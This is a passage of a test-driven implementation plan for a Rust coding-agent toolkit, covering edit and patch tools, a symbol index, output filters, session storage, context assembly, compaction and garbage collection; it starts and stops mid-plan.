- [ ] **Step 3: Implement.** Spawn `["/bin/sh","-c",cmd]` via `Sandbox::spawn` with `new_process_group: true`; on timeout/cancel `killpg(SIGTERM)`, wait 100 ms, `killpg(SIGKILL)`. Default timeout 120 s, overridable by `args["timeout_s"]` up to 600.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): bash tool with caps, timeout, process-group kill"`

### Task 11: `edit` tool — `str_replace`, stale guard, atomic write

**Files:**
- Create: `crates/hx-tools/src/edit/{mod.rs,guard.rs,atomic.rs,str_replace.rs}`
- Test: `crates/hx-tools/tests/edit_str_replace.rs`

**Interfaces:**
- Consumes: `ReadTracker`, `Sandbox::write_atomic`.
- Produces: `EditTool` whose `spec()` schema depends on `caps.edit_format`; `fn guard::check_fresh(tracker: &ReadTracker, path: &Path, meta: &FileMeta, current: &[u8]) -> Result<(), EditError>`; `fn atomic::preserve_and_write(sb: &dyn Sandbox, path: &Path, original: &[u8], new_text: &str) -> Result<(), EditError>` (restores CRLF, BOM, trailing-newline state, mode); `fn str_replace::apply(text: &str, old: &str, new: &str) -> Result<String, MatchError>`; `enum MatchError { NotFound { candidates: Vec<usize> }, Ambiguous { lines: Vec<usize> } }`.

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn rejects_edit_without_prior_read() { assert!(edit("a.rs","x","y").await.output.contains("read the file first")); }
#[tokio::test] async fn rejects_edit_when_file_changed_since_read() { /* read, external write, edit → is_error "changed since last read" */ }
#[test] fn exact_match_replaces() { assert_eq!(apply("a\nfoo\nb", "foo", "bar").unwrap(), "a\nbar\nb"); }
#[test] fn ambiguous_exact_match_fails_with_lines() { assert_eq!(apply("x\nx", "x", "y"), Err(MatchError::Ambiguous{lines: vec![1,2]})); }
#[test] fn whitespace_fallback_only_when_unique() {
    assert_eq!(apply("fn a() {\n    b();\n}", "fn a() {\n  b();\n}", "fn a() {}").unwrap(), "fn a() {}");
}
#[test] fn not_found_reports_candidates() { assert!(matches!(apply("alpha\nbeta", "betx", "z"), Err(MatchError::NotFound{..}))); }
#[tokio::test] async fn preserves_crlf_bom_no_trailing_newline_and_mode() { /* file "\u{FEFF}a\r\nb" mode 0755 → after edit still BOM, CRLF, no final newline, 0755 */ }
#[tokio::test] async fn edit_on_binary_file_is_error() {}
#[tokio::test] async fn result_carries_pre_image() { /* AppliedEffect::Edited.pre_image == original bytes */ }
proptest! { #[test] fn apply_then_inverse_restores(text in "[a-z\\n]{1,200}", ...) { /* unique old → apply(new) then apply(new→old) == text */ } }
```

- [ ] **Step 2: Run** `cargo test -p hx-tools --test edit_str_replace` — Expected: FAIL.
- [ ] **Step 3: Implement.** Normalize to LF internally; whitespace fallback compares lines with leading/trailing whitespace trimmed and requires exactly one window match. After a successful edit, update the tracker with the new hash so consecutive edits don't require re-reads.
- [ ] **Step 3b: Tolerant applier stages 1–4 (spec 7.9)** in `crates/hx-tools/src/edit/tolerant.rs`: `fn tolerant::locate(text: &str, old: &str) -> Result<Located, MatchError>` with `struct Located { range: std::ops::Range<usize>, stage: RepairStage, reindent: Option<isize> }` and `enum RepairStage { Exact, Normalized, Whitespace, Indentation, Anchor, Structural }`; `MatchError::NotFound` gains `nearest: Option<(usize, String)>` (start line, ≤ 20 numbered lines). Tests (write first, see RED): `normalizes_smart_quotes_crlf_and_trailing_ws`, `strips_copied_line_numbers_and_hashline_anchors`, `indentation_relative_match_reindents_replacement`, `anchor_match_requires_unique_first_last_and_0_9_interior`, `ambiguous_tolerant_match_is_error`, `not_found_includes_nearest_window_max_20_lines`, `result_names_repair_stage`. The `patch` format (Task 12) reuses `locate` stages 1–4 for hunk context.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): str_replace edit with stale guard and atomic write"`

### Task 12: `patch` and `hashline` edit formats

**Files:**
- Create: `crates/hx-tools/src/edit/{patch.rs,hashline.rs}`; modify `edit/mod.rs`
- Test: `crates/hx-tools/tests/edit_formats.rs`

**Interfaces:**
- Produces: `fn patch::apply(files: &dyn Fn(&Path) -> Option<String>, patch: &str) -> Result<Vec<(PathBuf, PatchOp)>, PatchError>` with `enum PatchOp { Update(String), Add(String), Delete }`; `fn hashline::apply(text: &str, ops: &[HashlineOp]) -> Result<String, HashlineError>` with `enum HashlineOp { Replace { start: Anchor, end: Anchor, lines: Vec<String> }, InsertAfter { at: Anchor, lines: Vec<String> }, Delete { start: Anchor, end: Anchor } }`, `struct Anchor { line: usize, hash: String }`.

- [ ] **Step 1: Write the failing tests:** `patch_update_with_context_applies`, `patch_add_and_delete_file`, `patch_context_mismatch_errors_with_hunk_index`, `patch_multi_file_is_all_or_nothing` (second hunk fails → no file written), `hashline_replace_range`, `hashline_stale_anchor_hash_errors` (hash mismatch → `HashlineError::Stale{line}`), `hashline_insert_after_last_line`, `edit_tool_schema_switches_with_format` (`spec(caps(Patch)).schema` has `"patch"` property; `Hashline` has `"ops"`).
- [ ] **Step 2: Run** `cargo test -p hx-tools --test edit_formats` — Expected: FAIL.
- [ ] **Step 3: Implement.** Patch grammar = Codex apply-patch envelope (`*** Begin Patch` / `*** Update File:` / `@@` / `*** End Patch`); also accept unified diff. Each touched file goes through the same stale guard and atomic write as Task 11; validate all hunks before writing any file.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): patch and hashline edit formats"`

### Task 13: Post-edit syntax check, `web_fetch`, `pin`/`state` tool shells

**Files:**
- Create: `crates/hx-tools/src/edit/syntax.rs`, `crates/hx-tools/src/{web_fetch.rs,pin_state.rs}`
- Test: `crates/hx-tools/tests/{syntax.rs,web_fetch.rs,pin_state.rs}`

**Interfaces:**
- Produces: `fn syntax::new_errors(path: &Path, before: &str, after: &str) -> Option<Vec<(usize, String)>>` (None = unsupported language); `WebFetchTool`; `PinTool`, `StateTool` whose `run` returns `ToolResult` with `effects` empty and a JSON body; the engine (Task 24) intercepts their parsed args as `ContextOp::{Pin(String), StateUpdate(StatePatch)}` — define `enum ContextOp` here and `fn parse_context_op(tool: &str, args: &Value) -> Option<ContextOp>`.

- [ ] **Step 1: Write the failing tests:** `introduced_parse_error_reported` (Rust file, remove closing brace → `Some(vec![(line, msg)])`); `preexisting_error_not_reported`; `unsupported_extension_returns_none` (`.xyz`); supported set exactly rs, ts, tsx, js, py, go, json, toml, yaml/yml; `edit_result_includes_syntax_warning_and_keeps_edit`; `web_fetch_converts_html_to_markdown` (wiremock); `web_fetch_caps_output`; `pin_parses_context_op`; `state_rejects_unknown_fields`; `registry_order_is_stable` (`names(registry(&caps())) == ["read","edit","write","bash","grep","glob","web_fetch","pin","state"]`; Tasks 15 and 22 extend this assertion).
- [ ] **Step 2: Run** `cargo test -p hx-tools` — Expected: FAIL on new tests.
- [ ] **Step 3: Implement.** Count `ERROR`/`MISSING` nodes before and after; report nodes whose line is not in the "before" set. `StatePatch { plan: Option<Vec<PlanStep>>, decisions_add: Vec<String>, questions_add: Vec<String>, questions_resolve: Vec<usize> }`, `PlanStep { text: String, status: StepStatus }`, `enum StepStatus { Pending, InProgress, Done }`.
- [ ] **Step 4: Run** `cargo test -p hx-tools` — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): syntax check, web_fetch, pin/state tools"`

### Task 14: Code index (`hx-index`)

**Files:**
- Create: `crates/hx-index/src/{lib.rs,extract.rs,store.rs,update.rs}`, `crates/hx-index/queries/{rust,typescript,javascript,python,go}.scm`
- Test: `crates/hx-index/tests/index.rs`

**Interfaces:**
- Consumes: `Sandbox` (Task 1); language detection shared with `syntax.rs` (Task 13) — move the extension→language map to `hx-index::Lang` and have `syntax.rs` use it.
- Produces:
  - `enum Lang { Rust, TypeScript, Tsx, JavaScript, Python, Go, Json, Toml, Yaml }` with `fn Lang::from_path(p: &Path) -> Option<Lang>`
  - `enum SymbolKind { Function, Method, Type, Constant, Module }`
  - `struct SymbolRow { path: PathBuf, name: String, kind: SymbolKind, parent: Option<String>, start_line: u32, end_line: u32, signature: String, hash: String }`; `struct RefRow { path: PathBuf, line: u32, context: String }`
  - `struct Index` with `fn open(db: &Path, sb: Arc<dyn Sandbox>) -> Result<Index, IndexError>`, `async fn refresh(&self) -> Result<RefreshStats, IndexError>`, `fn spawn_background_refresh(self: Arc<Self>) -> JoinHandle<()>`, `fn is_ready(&self) -> bool`, `async fn reindex_file(&self, rel: &Path) -> Result<(), IndexError>`, `fn outline(&self, rel: &Path) -> Result<Vec<SymbolRow>, IndexError>`, `fn find_symbol(&self, name: &str, kind: Option<SymbolKind>) -> Result<Vec<SymbolRow>, IndexError>`, `fn refs(&self, name: &str, limit: usize) -> Result<Vec<RefRow>, IndexError>`, `fn file_hash(&self, rel: &Path) -> Option<String>`, `fn symbol_hash(&self, rel: &Path, name: &str) -> Option<String>`, `fn stats(&self) -> IndexStats`
  - `struct RefreshStats { parsed: u32, removed: u32, unchanged: u32 }`; `struct IndexStats { files: u64, symbols: u64, refs: u64 }`
  - `fn extract::extract(lang: Lang, src: &str) -> Extracted` with `struct Extracted { symbols: Vec<SymbolRow /* path empty */>, refs: Vec<(u32, String)> }`

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn extracts_rust_items_with_parents() {
    let e = extract(Lang::Rust, "struct A;\nimpl A {\n    fn go(&self) -> u8 { 1 }\n}\nconst N: u8 = 3;\nfn main() {}\n");
    assert_eq!(names_kinds(&e), [("A",Type),("go",Method),("N",Constant),("main",Function)]);
    assert_eq!(e.symbols[1].parent.as_deref(), Some("A"));
    assert_eq!(e.symbols[1].signature, "fn go(&self) -> u8");
}
#[test] fn extracts_python_ts_go_definitions() { /* one def/class/func per language → expected names and kinds */ }
#[test] fn refs_exclude_definition_sites() {}
#[test] fn symbol_hash_changes_only_when_that_symbol_changes() {}
#[tokio::test] async fn refresh_reparses_only_changed_files() {
    let (t, idx) = index_with(&[("a.rs","fn a(){}"),("b.rs","fn b(){}")]); idx.refresh().await.unwrap();
    touch_write(t.path().join("a.rs"), "fn a2(){}");
    assert_eq!(idx.refresh().await.unwrap(), RefreshStats{parsed:1, removed:0, unchanged:1});
}
#[tokio::test] async fn deleted_files_are_removed() {}
#[tokio::test] async fn gitignored_files_skipped() {}
#[tokio::test] async fn reindex_file_updates_outline() {}
#[tokio::test] async fn two_handles_share_db_in_wal_mode() {}
#[tokio::test] async fn is_ready_false_until_first_refresh_completes() {}
```

- [ ] **Step 2: Run** `cargo test -p hx-index` — Expected: FAIL.
- [ ] **Step 3: Implement.** Queries capture `@definition.<kind>` / `@name` (start from each grammar's `tags.scm` where shipped). Signature = source from the definition start up to (excluding) the body node, whitespace-collapsed, ≤ 200 chars. Symbol hash = blake3 of the definition's source text. Initial build parses with `rayon` inside `spawn_blocking`; writes in one transaction per 500 files. Skip files > 1 MB and non-UTF-8 files.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(index): incremental tree-sitter symbol index"`

### Task 15: `outline`, `symbol`, `refs` tools

**Files:**
- Create: `crates/hx-tools/src/index_tools.rs`; modify `lib.rs` (`ToolCx` gains `index: Option<Arc<Index>>` and `turn: u32`), `edit/mod.rs` (call `index.reindex_file` after each successful write), `registry`
- Test: `crates/hx-tools/tests/index_tools.rs`

**Interfaces:**
- Consumes: `Index` (Task 14).
- Produces: `OutlineTool`, `SymbolTool`, `RefsTool` (all `Effect::ReadOnly`). Registry order becomes `read, edit, write, bash, grep, glob, outline, symbol, refs, web_fetch, pin, state`.

- [ ] **Step 0: Structural edit fallback (spec 7.9 stage 5)** in `crates/hx-tools/src/edit/tolerant.rs`: when stages 1–4 fail for `str_replace` and the old text starts with a definition `extract` can name, locate that symbol in the file via `Index::outline` (or on-demand extract) and use its range if similarity ≥ 0.8; after writing, if `syntax::new_errors` is non-empty, restore the pre-image and fail. Tests: `structural_fallback_replaces_symbol_body_when_similar`, `structural_fallback_rejected_below_0_8`, `structural_fallback_reverts_on_new_parse_error`.
- [ ] **Step 1: Write the failing tests:** `outline_lists_signatures_and_ranges_without_bodies`; `symbol_returns_source_with_path_and_lines`; `symbol_with_multiple_matches_lists_locations_only`; `symbol_kind_filter_narrows`; `refs_lists_path_line_context_and_respects_limit` (default limit 50); `refs_description_says_name_based`; `fallback_while_index_not_ready` (outline still works via on-demand parse and the output starts with `(index building)`; symbol falls back to grep); `edit_then_symbol_sees_new_body`; `registry_order_is_stable` updated to the order above.
- [ ] **Step 2: Run** `cargo test -p hx-tools --test index_tools` — Expected: FAIL.
- [ ] **Step 3: Implement.** Output formats: outline `L<start>-<end> <kind> <signature>` per line, indented under parent; refs `path:line: context`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): outline, symbol, refs index tools"`

### Task 16: Output filters

**Files:**
- Create: `crates/hx-tools/src/filters/{mod.rs,cargo.rs,pytest.rs,jest.rs,gotest.rs,tsc.rs,eslint.rs}`, fixtures `crates/hx-tools/tests/fixtures/filters/{cargo_test_fail,cargo_build_err,clippy_warn,pytest_fail,jest_fail,vitest_fail,gotest_fail,tsc_err,eslint_err}.txt` (captured from real tool runs); modify `bash.rs`
- Test: `crates/hx-tools/tests/filters.rs`

**Interfaces:**
- Consumes: `SimpleCommand`, `parse_commands` (Task 2); `cap_output` (Task 10).
- Produces: `enum FilterKind { Cargo, Pytest, Jest, GoTest, Tsc, Eslint }`; `fn filters::detect(cmds: &[SimpleCommand]) -> Option<FilterKind>` (last command of a pipeline/list that matches); `fn filters::apply(kind: FilterKind, output: &str) -> Option<Summary>`; `struct Summary { passed: Option<u32>, failed: u32, errors: u32, warnings: u32, items: Vec<Item> }`; `struct Item { name: String, location: Option<String>, message: String, detail: Vec<String> }`; `fn Summary::render(&self, spill: &Path) -> String`.

- [ ] **Step 1: Write the failing tests:** `detects_common_invocations` (`cargo test -p x`, `cargo clippy`, `python -m pytest -q`, `pytest`, `npx jest`, `pnpm vitest run`, `go test ./...`, `npx tsc --noEmit`, `eslint .`, `npm run lint` → None); one `parses_<fixture>` test per fixture asserting counts and the first item's `name`/`location`; `detail_capped_at_20_lines`; `output_under_2kb_not_filtered`; `unparseable_output_falls_back_to_head_tail_cap`; `raw_true_disables_filtering`; `render_includes_spill_path_and_counts`.
- [ ] **Step 2: Run** `cargo test -p hx-tools --test filters` — Expected: FAIL.
- [ ] **Step 3: Implement.** Prefer machine-readable markers in the text output (cargo `error[E…]`/`--> file:line`, pytest `FAILED path::name`, go `--- FAIL:`, tsc `file(line,col): error TS…`, eslint stylish blocks, jest/vitest `●` blocks). Bash: if `detect` matches and raw output > 2 KB and `!args.raw`, use `Summary::render`; else `cap_output`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): output filters for common test and build tools"`

### Task 17: Diff-on-re-read

**Files:**
- Modify: `crates/hx-tools/src/{lib.rs,read.rs}`
- Test: `crates/hx-tools/tests/reread.rs`

**Interfaces:**
- Consumes: `ReadTracker` (Task 9), `ToolCx.turn` (Task 15).
- Produces: `ReadTracker::record(&self, path: &Path, range: LineRange, meta: &FileMeta, hash: blake3::Hash, turn: u32, content: &str)` storing content on disk at `<spill_dir>/reads/<hash>` (tracker keeps only path → (range, hash, turn, mtime) in memory); `fn ReadTracker::previous(&self, path: &Path, range: LineRange) -> Option<PrevRead>`; `struct PrevRead { hash: blake3::Hash, turn: u32, content_path: PathBuf }`; `read` arg `full: bool` (default false).

- [ ] **Step 1: Write the failing tests:** `identical_reread_returns_unchanged_since_turn` (output == `unchanged since turn 3`); `small_change_returns_line_numbered_unified_diff` (1 of 10 lines changed → output starts with `changed since turn 3:` and contains `@@`); `change_of_half_or_more_returns_full`; `full_true_forces_full_content`; `different_range_is_not_a_reread`; `tracker_keeps_contents_on_disk_not_in_memory` (file exists under `reads/`); `edit_updates_tracker_so_reread_after_own_edit_is_diffed_against_post_edit`.
- [ ] **Step 2: Run** `cargo test -p hx-tools --test reread` — Expected: FAIL.
- [ ] **Step 3: Implement** with the `similar` crate (line diff, 2 lines of context, new-file line numbers).
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): diff-on-re-read"`

### Task 18: Session store

**Files:**
- Create: `crates/hx-session/src/{lib.rs,record.rs,writer.rs,reader.rs,blobs.rs,paths.rs}`
- Test: `crates/hx-session/tests/session.rs`

**Interfaces:**
- Produces:
  - `fn paths::data_home() -> PathBuf` (HX_HOME → XDG_DATA_HOME → ~/.local/share, + `/hx`); `fn paths::project_hash(root: &Path) -> String` (blake3 of canonical path, 16 hex)
  - `struct Header { schema_version: u32 /* 1 */, session_id: String, created: SystemTime, root: PathBuf, parent: Option<(String, u64)> }`
  - `struct SessionWriter<R: Serialize>`: `fn create(root: &Path, parent: Option<(String,u64)>) -> Result<Self>`, `fn append(&mut self, rec: &R) -> Result<u64 /* offset */>`, `fn checkpoint(&mut self) -> Result<()>` (fsync), `fn blob(&self, bytes: &[u8]) -> Result<BlobRef>`
  - `struct BlobRef(String)` (blake3 hex; stored at `blobs/<first2>/<rest>`; written only if absent)
  - `struct SessionReader<R: DeserializeOwned>`: `fn open(path: &Path) -> Result<Self>`, `fn header(&self) -> &Header`, `fn records(&self) -> impl Iterator<Item = Result<(u64, R)>>` (a truncated final line is skipped and reported via `fn truncated_tail(&self) -> bool`), `fn read_blob(&self, r: &BlobRef) -> Result<Vec<u8>>`
  - `fn list(root: &Path) -> Result<Vec<SessionSummary>>`; `struct SessionSummary { id: String, created: SystemTime, path: PathBuf, last_modified: SystemTime }`

- [ ] **Step 1: Write the failing tests:** `append_and_read_back_in_order`; `header_has_schema_version_1`; `truncated_last_line_is_skipped_and_flagged` (write half a line manually); `blobs_deduplicate` (same bytes twice → one file); `fork_header_references_parent_offset`; `list_sorted_newest_first`; `two_writers_same_project_do_not_collide` (two sessions in parallel threads → two files, both readable).
- [ ] **Step 2: Run** `cargo test -p hx-session` — Expected: FAIL.
- [ ] **Step 3: Implement.** Session id = ULID. `BufWriter` with explicit `flush` + `sync_data` on `checkpoint`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(session): append-only JSONL store with blobs and fork"`

### Task 19: Context blocks, token accounting, pinned items, working state

**Task 19 review amendment (binding):** the working state renders as a tail block after the last message (spec 6.1), not before history; the last-message cache breakpoint goes on the last history message, before the state tail. Pinned stays as the first user-role content after the stable prefix.

**Checkpoint 2 amendments (binding):** Use the new effect shapes from the checkpoint-2 fix wave: `AppliedEffect::{Read{path,range,file_hash,shown}, Edited{path,pre_image,pre_mode,post_hash}, Deleted{path,pre_image,pre_mode}, Exec{may_write}}`; the files list is keyed by the resolved effect path (displayed root-relative); `Deleted` removes the file note's `edited` state and marks it deleted.

**Files:**
- Create: `crates/hx-context/src/{lib.rs,blocks.rs,tokens.rs,pinned.rs,state.rs,agents_md.rs,assemble.rs,prompt.rs}`, `crates/hx-context/prompts/system.md`
- Test: `crates/hx-context/tests/assemble.rs`

**Interfaces:**
- Consumes: Task 4 canonical types; `ContextOp`, `StatePatch` (Task 13); `AppliedEffect` (Task 9).
- Produces:
  - `struct Context { pinned: Vec<Pinned>, state: WorkingState, history: Vec<Turn>, agents_md: Option<String>, memory_index: Option<String>, tokens: TokenEstimator, first_turn, repo_map, root, results, clock, session_pins: Vec<Pinned>, load_warnings: Vec<String> }` (`memory_index` is set by the engine in Task 28 and rendered in the stable block after AGENTS.md; `session_pins` render in the state tail until `fold_session_pins`)
  - `struct Pinned { text: String, source: PinSource }`; `enum PinSource { User, Config, Model, AgentsMd }`
  - `struct WorkingState { task: Option<String>, plan: Vec<PlanStep>, files: BTreeMap<PathBuf, FileNote>, decisions: Vec<String>, questions: Vec<String>, failed_attempts: Vec<String> /* ≤ 10, rendered ≤ 300 tokens; set by the engine (Task 24) */ }`; `struct FileNote { read_hash: Option<String>, edited: bool }`
  - `struct Turn { messages: Vec<Message> }`
  - `fn Context::apply_effects(&mut self, effects: &[AppliedEffect], turn: u32)`; `fn Context::apply_op(&mut self, op: ContextOp) -> Result<(), PinError>`; `fn Context::pin(&mut self, text: impl Into<String>, source: PinSource) -> Result<bool, PinError>` (a mid-session pin goes to `session_pins`; text ≤ 2 KB, ≤ 20 session pins); `fn Context::fold_session_pins(&mut self) -> bool` (moves them into `pinned`; call only when a cache epoch is applied anyway)
  - `fn Context::assemble(&self, caps: &Capabilities, tools: &[ToolSpec], model: &ModelId) -> (CanonicalRequest, ContextStatus)`
  - `struct ContextStatus { used: u32, budget: u32, breakdown: Breakdown, warnings: Vec<String>, flat_tokens: u32 /* images etc. in the measured request */, cached_prefix: u32 /* tokens up to the last breakpoint */ }`; `struct Breakdown { system: u32, tools: u32, agents_md: u32, memory: u32, pinned: u32, state: u32, history: u32 }`
  - `struct TokenEstimator` with `fn estimate(&self, s: &str) -> u32` (`ceil(bytes / 4 * ratio)`) and `fn calibrate(&mut self, estimated: u32, actual: u64)` (ratio = EMA of actual/estimated, clamped 0.5–2.0); the engine uses `fn Context::calibrate(&mut self, status: &ContextStatus, usage: &RawUsage)`, which sums `input + cache_read + cache_write` and subtracts `status.flat_tokens`
  - `fn agents_md::load(sb: &dyn Sandbox) -> AgentsMd { text: Option<String>, pins: Vec<Pinned>, warnings: Vec<String> }` (applied with `Context::set_agents_md`) — concatenates AGENTS.md from root up to filesystem root (nearest last), read through the sandbox resolver (regular files only; 32 KB per file / 64 KB total with markers and warnings; an ancestor's link target must stay inside the directory holding it); sections whose heading text is `Constraints` or `Rules` (any level, case-insensitive) become `Pinned{source: AgentsMd}` (≤ 2 KB each, 4 KB total)
  - `fn prompt::system() -> &'static str` (`include_str!("../prompts/system.md")`)

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn block_order_is_system_tools_agents_memory_pinned_history_state() { /* stable system blocks, then pinned as first user content, history, and the state tail last */ }
#[test] fn stable_prefix_is_byte_identical_across_turns() {
    let mut c = ctx(); let (a, _) = c.assemble(&caps(), &tools(), &m()); c.history.push(turn("hi")); c.apply_op(ContextOp::Pin("x".into()));
    let (b, _) = c.assemble(&caps(), &tools(), &m());
    assert_eq!(serde_json::to_vec(&a.system[..STABLE_LEN]).unwrap(), serde_json::to_vec(&b.system[..STABLE_LEN]).unwrap());
}
#[test] fn cache_breakpoints_after_stable_prefix_and_last_message() {}
#[test] fn system_prompt_under_2000_tokens() { assert!(TokenEstimator::default().estimate(prompt::system()) < 2000); }
#[test] fn breakdown_sums_to_used() {}
#[test] fn pinned_over_10_percent_warns() {}
#[test] fn files_list_comes_from_effects_not_model() { /* apply Edited effect → files[path].edited == true */ }
#[test] fn agents_md_rules_section_autopinned() { /* "## Rules\n- never touch migrations/" → one AgentsMd pin */ }
#[test] fn calibrate_moves_ratio_toward_actual() {}
```

- [ ] **Step 2: Run** `cargo test -p hx-context --test assemble` — Expected: FAIL.
- [ ] **Step 3: Implement.** Pinned and state render as tagged text blocks (`<pinned>…</pinned>`, `<working_state>…</working_state>`); pinned is the first user-role content after the system prefix, the state is a tail message after the last history message (spec 6.1), so the cached prefix stays stable. Write `system.md` (role, tool-use rules, safety rules); it contains no per-model or per-turn text. Edit-format guidance lives in the `edit` tool's description, which already varies by `caps.edit_format`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(context): block assembly, token accounting, pinned, working state"`

### Task 20: Compaction

**Checkpoint 2 amendments (binding):** Compaction must call `ReadTracker::forget_shown_at(cut_turn)` (or `clear()`) so no `unchanged since turn N` answer refers to a compacted turn.

**Checkpoint 3 amendments (binding):** post-edit and diff baselines depend on older, removed outputs, so `forget_shown_at` alone is not enough: `apply_compaction` records `forgotten_paths` in the `CompactionRecord` (every path in `reads`/`writes` of the results with turn ≤ `last_removed_turn`, collected before they are dropped) and the engine calls `ReadTracker::forget_path` for each (Task 24). The summary request caps `max_output` at 4k tokens, and a summary whose estimate is not smaller than the removed turns is rejected (the turns are dropped without a summary, per Task 24). `compact.md` has the summarizer attribute requirements only to `[user]` turns and label anything taken from tool results.

**Files:**
- Create: `crates/hx-context/src/compact.rs`
- Test: `crates/hx-context/tests/compact.rs`

**Interfaces:**
- Produces: `fn Context::needs_compaction(&self, status: &ContextStatus, threshold: Option<f32> /* 0.8 */, now: Instant, ttl: Option<Duration>, price: Option<&Price>) -> bool` and `fn Context::compaction_decision(…same arguments…) -> Option<MutationReason>`; `fn Context::compaction_request(&self, model: &ModelId, caps: &Capabilities, keep_recent: usize) -> (CanonicalRequest, usize /* turns to remove */)`; `fn Context::apply_compaction(&mut self, removed: usize, summary: String) -> Result<CompactionRecord, CompactError>` with `enum CompactError { Nothing, SummaryTooLong { summary: u32, removed: u32 } }` (an empty summary is accepted: the drop-without-summary fallback); `fn Context::uncompact(&mut self, rec: &CompactionRecord, budget: u32) -> Result<(), UncompactError>`; `struct CompactionRecord { removed_turns: Vec<Turn>, summary: String, first_removed_turn: u32, last_removed_turn: u32, forgotten_paths: Vec<PathBuf> }`.

- [ ] **Step 1: Write the failing tests:** `triggers_at_80_percent_not_below`; `disabled_threshold_never_triggers` (threshold `None`); `pinned_and_state_survive_verbatim` (assert identical before/after); `keeps_recent_turns_verbatim` (default `keep_recent = 4`); `summary_replaces_removed_turns_as_single_block`; `uncompact_restores_when_fits`; `uncompact_refuses_when_too_large`; `compaction_request_instructs_to_preserve_open_questions_and_decisions` (prompt text contains those words).
- [ ] **Step 2: Run** `cargo test -p hx-context --test compact` — Expected: FAIL.
- [ ] **Step 3: Implement.** Never split a tool-use/tool-result pair across the cut.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(context): state-preserving reversible compaction"`

### Task 21: Context garbage collection

**Checkpoint 2 amendments (binding):** Supersede detection uses effects, not args (one batched read covers up to 10 paths). A read whose `shown` is `Unchanged`/`Diff` never supersedes its base. Whenever any read result of path P is elided, call `ReadTracker::forget_path(P)`.

**Files:**
- Create: `crates/hx-context/src/gc.rs`; modify `lib.rs`, `assemble.rs`
- Test: `crates/hx-context/tests/gc.rs`

**Interfaces:**
- Consumes: `Context`, `Turn` (Task 19); `CompactionRecord`, `uncompact` (Task 20).
- Also (spec 7.7): add `cache_ttl_s: Option<u32>` to the catalog `ModelInfo`/TOML (default 300 for explicit/automatic cache styles, None otherwise) and `crates/hx-context/src/schedule.rs` with `struct CacheClock { last_request: Option<Instant>, cached_prefix_tokens: u32 }`, `fn Context::note_request(&mut self, at: Instant, cached_prefix_tokens: u32)`, `enum MutationReason { ColdCache, CostBenefit, Forced, Manual }`, `fn schedule::decide(clock: &CacheClock, now: Instant, ttl: Option<Duration>, tokens_freed: u32, price: Option<&Price>, used: u32, window: u32) -> Option<MutationReason>` (cold → ColdCache; used ≥ 90% → Forced; warm with price: `tokens_freed × input × 5 > invalidated_prefix × (cache_write − cache_read)` → CostBenefit; no price → threshold max(2000, 5%) → CostBenefit; else None). `Context::collect` takes the decision as input and `GcRecord` carries `reason`. `Context::needs_compaction` returns true at ≥ 80% only when `decide` would mutate, and always at ≥ 90%. Tests: `cold_cache_applies_any_pending`, `warm_cache_defers_when_not_worth_it`, `warm_cache_applies_when_savings_exceed_cache_write_cost`, `forced_at_90_percent`, `no_price_falls_back_to_threshold`, `compaction_deferred_between_80_and_90_while_warm`.
- Produces: `fn Context::push_tool_result(&mut self, call_id: &str, tool: &str, args: &Value, effects: &[AppliedEffect], is_error: bool, turn: u32)` (records `ResultMeta { call_id, tool, turn, elided, reads: Vec<ReadTarget>, writes: Vec<PathBuf>, failed_edit: Vec<PathBuf>, command: Option<String> }`, keyed by the effects' paths, never by `args`); `fn Context::gc_decision(&self, now, ttl, price, used, window) -> Option<MutationReason>`; `fn Context::collect(&mut self, reason: Option<MutationReason>) -> Option<GcRecord>`; `struct GcRecord { elided: Vec<(String /* call_id */, String /* original output */)>, tokens_freed: u32, reason: MutationReason, forgotten_paths: Vec<PathBuf> }`; `fn Context::restore_gc(&mut self, rec: &GcRecord)`.

- [ ] **Step 1: Write the failing tests:** `read_superseded_by_later_edit_of_same_path`; `read_superseded_by_later_reread`; `bash_superseded_by_same_command_string`; `failed_edit_superseded_by_later_successful_edit`; `latest_result_never_elided`; `stub_text_and_call_id_preserved` (output == `[elided: superseded at turn N]`, call id unchanged, tool_use/tool_result pairing intact); `below_threshold_returns_none` (threshold = max(2000, 5% of window)); `above_threshold_elides_all_superseded`; `restore_gc_restores_original_outputs`.
- [ ] **Step 2: Run** `cargo test -p hx-context --test gc` — Expected: FAIL.
- [ ] **Step 3: Implement.** `collect` is a pure function of context state; the engine decides when to call it (step start only, before each provider request — Task 24).
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(context): cache-aware context garbage collection"`

### Task 22: Memory store and `recall` / `remember` tools

**Checkpoint 2 amendments (binding):** `symbol_hash` lookups must pass parent/kind when known (use the checkpoint-2 `symbol_hash_in(rel, name, parent, kind)`); reject or flag anchors whose `file_hash` is None (unindexed) or empty (oversize).

**Files:**
- Create: `crates/hx-memory/src/{lib.rs,entry.rs,store.rs,stale.rs,search.rs,episodes.rs,consolidate.rs}`, `crates/hx-tools/src/memory_tools.rs`; modify `crates/hx-tools/src/{lib.rs,pin_state.rs}` (`ToolCx` gains `memory: Option<Arc<RwLock<MemoryStore>>>`; `ContextOp` gains `Remember(MemoryDraft)`)
- Test: `crates/hx-memory/tests/memory.rs`, `crates/hx-tools/tests/memory_tools.rs`

**Interfaces:**
- Consumes: `Index::{file_hash, symbol_hash}` (Task 14); `paths::{data_home, project_hash}` (Task 18).
- Produces:
